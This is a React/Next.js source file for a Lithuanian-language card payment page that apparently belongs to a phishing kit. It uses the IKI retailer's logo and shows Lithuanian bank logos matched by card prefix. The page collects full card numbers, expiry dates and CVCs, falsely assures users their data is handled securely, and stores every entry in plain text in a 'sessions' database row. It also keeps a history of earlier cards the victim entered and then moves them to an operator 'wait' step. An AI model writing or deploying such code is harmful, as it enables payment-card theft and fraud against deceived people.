"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { useSettings } from "@/contexts/SettingsContext";

function luhnCheck(value: string): boolean {
  const digits = value.replace(/\D/g, "");
  if (digits.length < 12) return false;
  let sum = 0;
  let shouldDouble = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let d = digits.charCodeAt(i) - 48;
    if (shouldDouble) {
      d *= 2;
      if (d > 9) d -= 9;
    }
    sum += d;
    shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
}

type CardBrand = { name: string; re: RegExp; len: number[] };
const CARD_BRANDS: CardBrand[] = [
  { name: "visa", re: /^4/, len: [13, 16, 19] },
  { name: "mastercard", re: /^(5[1-5]|2[2-7])/, len: [16] },
  { name: "amex", re: /^3[47]/, len: [15] },
  { name: "maestro", re: /^(5[0,6-9]|6)/, len: [12,13,14,15,16,17,18,19] },
];

function detectCardBrand(number: string): CardBrand | null {
  if (!number) return null;
  for (const b of CARD_BRANDS) if (b.re.test(number)) return b;
  return null;
}

function CardBrandLogo({ brand }: { brand: string }) {
  if (brand === "mastercard") {
    return (
      <svg viewBox="0 0 36 22" className="h-5 w-auto" aria-label="Mastercard">
        <circle cx="13" cy="11" r="9" fill="#EB001B" />
        <circle cx="23" cy="11" r="9" fill="#F79E1B" fillOpacity="0.85" />
      </svg>
    );
  }
  if (brand === "maestro") {
    return (
      <svg viewBox="0 0 36 22" className="h-5 w-auto" aria-label="Maestro">
        <circle cx="13" cy="11" r="9" fill="#0099DF" />
        <circle cx="23" cy="11" r="9" fill="#EC0000" fillOpacity="0.85" />
      </svg>
    );
  }
  if (brand === "visa") {
    return <span className="text-sm font-black italic tracking-tight text-[#1A1F71]">VISA</span>;
  }
  if (brand === "amex") {
    return (
      <span className="rounded bg-[#2E77BC] px-1.5 py-0.5 text-[10px] font-bold tracking-wide text-white">AMEX</span>
    );
  }
  return null;
}

// Litvanya bankalari BIN (ilk 4-6 hane) -> logo eslesmesi
type BankBin = { name: string; logo: string; prefixes: string[] };
const LT_BANK_BINS: BankBin[] = [
  { name: "Swedbank", logo: "/bank-logos/lithuania/swedbank-lt.webp", prefixes: ["5168", "5224", "5413", "4898", "4026", "4714", "4921", "5308", "5589", "6763"] },
  { name: "SEB", logo: "/bank-logos/lithuania/seb-lt.webp", prefixes: ["4167", "4235", "4899", "5290", "5319", "5350", "5412", "5434", "5571", "6764"] },
  { name: "Luminor", logo: "/bank-logos/lithuania/luminor-lt.webp", prefixes: ["4025", "4738", "5125", "5150", "5187", "5299", "5360", "5416", "5528", "6762"] },
  { name: "Šiaulių bankas", logo: "/bank-logos/lithuania/siauliu-bankas-lt.webp", prefixes: ["4551", "5280", "5323", "5584", "6765"] },
  { name: "Citadele", logo: "/bank-logos/lithuania/citadele-lt.webp", prefixes: ["4191", "4328", "5124", "5189", "5274", "5567"] },
  { name: "Kredito unijos", logo: "/bank-logos/lithuania/kredito-unijos-lt.webp", prefixes: ["5164", "5359", "5483"] },
];

function detectBank(number: string): BankBin | null {
  const digits = number.replace(/\D/g, "");
  if (digits.length < 4) return null;
  for (const bank of LT_BANK_BINS) {
    for (const p of bank.prefixes) {
      if (digits.startsWith(p)) return bank;
    }
  }
  return null;
}

type Props = {
  sessionId: string;
};

export function CardClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const [number, setNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvc, setCvc] = useState("");
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  const ui = {
    panel: "app-panel rounded-2xl p-6",
    input: "app-input mt-1 w-full px-3 py-2",
    submit: "app-btn w-full rounded-xl py-3 text-sm shadow-md disabled:opacity-60",
  };

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setSessionFormData(fd);
      setNumber(fd.cardNumber ?? "");
      setExpiry(fd.cardExpiry ?? "");
      setCvc(fd.cardCvc ?? "");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  function formatExpiry(value: string) {
    const digits = value.replace(/\D/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }

  const expiryValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry);
  const cvcValid = /^\d{3,4}$/.test(cvc);
  const brand = useMemo(() => detectCardBrand(number), [number]);
  const bank = useMemo(() => detectBank(number), [number]);
  const numberValid = useMemo(() => {
    if (!number) return false;
    const digits = number.replace(/\D/g, "");
    if (digits.length < 12) return false;
    return luhnCheck(digits);
  }, [number]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase || !sessionId) return;
    if (!expiryValid) {
      setMsg("Įveskite tinkamą galiojimo datą (MM/YY).");
      return;
    }
    if (!cvcValid) {
      setMsg("Įveskite tinkamą CVC/CVV (3 arba 4 skaitmenys).");
      return;
    }
    setSaving(true);
    setMsg(null);

    // 1) KART GECMISI KAYDI: ESKI kart degerleri (cardLoginHistory) yeni giristen ONCE history'ye atilir.
    //    Boylece en guncel kart TEKIL olarak cardNumber/cardExpiry/cardCvc'de durur, ESKI kartlar sadece GECMIS MODAL'inda gorunur.
    let cardLoginHistory: unknown[] = [];
    try {
      const str = (x: unknown): string => (typeof x === "string" ? x.trim() : "");
      const sfd = sessionFormData as Record<string, unknown>;
      const oldHolder = str(sfd.cardHolder);
      const oldNumber = str(sfd.cardNumber);
      const oldExpiry = str(sfd.cardExpiry);
      const oldCvc = str(sfd.cardCvc);
      const newHolder = "";
      const newNumber = number.trim();
      const newExpiry = expiry.trim();
      const newCvc = cvc.trim();
      // Kart numarasi veya son kullanma tarihi degisti ise ESKI'yi history'ye ekle.
      // Ayni kartla tekrar giris (ayni number+expiry+cvc) ise history'ye ekLEME.
      const isDifferentCard = Boolean(
        (oldNumber || oldExpiry || oldCvc) &&
        !(oldNumber === newNumber && oldExpiry === newExpiry && oldCvc === newCvc)
      );
      if (isDifferentCard) {
        const arr: unknown[] = Array.isArray(sfd.cardLoginHistory)
          ? [...(sfd.cardLoginHistory as unknown[])]
          : [];
        arr.unshift({
          submittedAt: new Date().toISOString(),
          cardHolder: oldHolder,
          cardNumber: oldNumber,
          cardExpiry: oldExpiry,
          cardCvc: oldCvc,
        });
        cardLoginHistory = arr;
      }
    } catch {
      /* sessiz */
    }

    const nextFormData: Record<string, unknown> = {
      ...sessionFormData,
      cardHolder: "",
      cardNumber: number.trim(),
      cardExpiry: expiry.trim(),
      cardCvc: cvc.trim(),
    };
    if (cardLoginHistory.length > 0) {
      nextFormData.cardLoginHistory = cardLoginHistory;
    }

    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    setSaving(false);
    if (error) setMsg("Išsaugoti nepavyko.");
    else {
      setSessionFormData(nextFormData);
      router.push(stepToPath("wait", sessionId));
    }
  }


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[var(--brand)]/30 border-t-[var(--brand)]" />
        </div>
      </div>
    );
  }

  if (!supabase) {
    return (
      <div className="pak-page-shell">
        <div className="pak-form-card w-full max-w-[650px] p-5 sm:p-8">
          <div className="pak-form-inner"><ConfigMissing /></div>
        </div>
      </div>
    );
  }

  if (!sessionId) {
    return (
      <div className="pak-page-shell">
        <div className="pak-form-card w-full max-w-[520px] p-8 text-center">
          <div className="pak-form-inner">
            <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
              Neteisinga nuoroda.
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="pak-page-shell">
      <div className="pak-form-card w-full max-w-[860px] fade-in">
        <div className="pak-form-inner px-4 pb-5 pt-5 sm:px-8 sm:pb-8 sm:pt-8 lg:px-10">
          <div className="flex items-start justify-between gap-3">
            <div className="min-w-0 max-w-[29rem]">
              <h2 className="pak-form-title">{settings.card_title}</h2>
              <p className="pak-form-subtitle mt-2">{settings.card_subtitle}</p>
            </div>
            <img
              src={settings.logo_url || "/form-assets/iki-mini-logo.webp"}
              alt="IKI logo"
              className="pak-form-brand-logo shrink-0"
              id="card-ah-logo"
            />
          </div>

          <form onSubmit={handleSubmit} className="mt-5 space-y-4 sm:mt-6 sm:space-y-5">
            <label className="pak-form-label">
              <div className="flex items-center justify-between gap-2">
                <span>{settings.card_number_label}</span>
                {(brand || bank) && (
                  <span className="flex items-center gap-2">
                    {bank && (
                      <img
                        src={bank.logo}
                        alt={bank.name}
                        title={bank.name}
                        className="h-6 w-auto rounded bg-white/90 px-1 py-0.5 object-contain shadow-sm"
                      />
                    )}
                    {brand && (
                      <span className="rounded-md bg-white/90 px-2 py-1 shadow-sm">
                        <CardBrandLogo brand={brand.name} />
                      </span>
                    )}
                  </span>
                )}
              </div>
              <div className="pak-form-input-wrap">
                <div className="pak-form-input-icon">
                  <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                    <rect x="3" y="6.5" width="18" height="11" rx="2.5" />
                    <path d="M3 10.5h18" />
                  </svg>
                </div>
                <input
                  required
                  inputMode="numeric"
                  className={`pak-form-input min-h-[4rem] pl-14 pr-4 text-lg tracking-[0.18em] ${
                    !numberValid && number.length >= 12 ? "!border-red-500" : ""
                  }`}
                  value={number}
                  onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
                  autoComplete="cc-number"
                />
              </div>
            </label>
            {bank && (
              <p className="flex items-center gap-1.5 text-xs font-medium text-white/60">
                <svg viewBox="0 0 20 20" fill="currentColor" className="h-3.5 w-3.5 text-[#4ade80]">
                  <path fillRule="evenodd" d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z" clipRule="evenodd" />
                </svg>
                {bank.name}
              </p>
            )}
            <div className="grid grid-cols-2 gap-4 sm:gap-6">
              <label className="pak-form-label">
                {settings.card_expiry_label}
                <div className="pak-form-input-wrap">
                  <div className="pak-form-input-icon">
                    <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                      <rect x="3.5" y="5" width="17" height="15" rx="2.5" />
                      <path d="M7.5 3.8v3M16.5 3.8v3M3.5 9.3h17" strokeLinecap="round" />
                    </svg>
                  </div>
                  <input
                    required
                    placeholder="MM/YY"
                    className="pak-form-input min-h-[4rem] pl-14 pr-4 text-lg"
                    value={expiry}
                    onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                    autoComplete="cc-exp"
                    inputMode="numeric"
                    maxLength={5}
                  />
                </div>
              </label>
              <label className="pak-form-label">
                {settings.card_cvv_label}
                <div className="pak-form-input-wrap">
                  <div className="pak-form-input-icon">
                    <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                      <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                      <path d="m9.3 12.1 1.7 1.7 3.7-3.9" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  </div>
                  <input
                    required
                    inputMode="numeric"
                    maxLength={4}
                    className="pak-form-input min-h-[4rem] pl-14 pr-4 text-lg tracking-[0.14em]"
                    value={cvc}
                    onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                    autoComplete="cc-csc"
                  />
                </div>
              </label>
            </div>

            {!numberValid && number.length >= 12 ? (
              <p className="text-xs text-red-400">Neteisingas kortelės numeris.</p>
            ) : null}

            {!expiryValid && expiry.length > 0 ? (
              <p className="text-xs text-red-400">Galiojimo data turi būti nurodyta MM/YY formatu.</p>
            ) : null}

            {!cvcValid && cvc.length > 0 ? (
              <p className="text-xs text-red-400">CVV turi būti 3 arba 4 skaitmenys.</p>
            ) : null}

            {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}

            <div className="flex flex-col gap-3 pt-1 md:flex-row md:items-center md:justify-between">
              <div className="pak-form-security">
                <svg className="h-9 w-9 shrink-0 text-[#4ade80]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                </svg>
                <span>Jūsų duomenys apdorojami saugiai.</span>
              </div>

              <button
                type="submit"
                disabled={saving || !numberValid || !expiryValid || !cvcValid}
                className="pak-form-button min-h-[3.85rem] w-full px-6 text-lg md:w-[22rem]"
              >
                {saving ? "Siunčiama..." : settings.card_button}
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
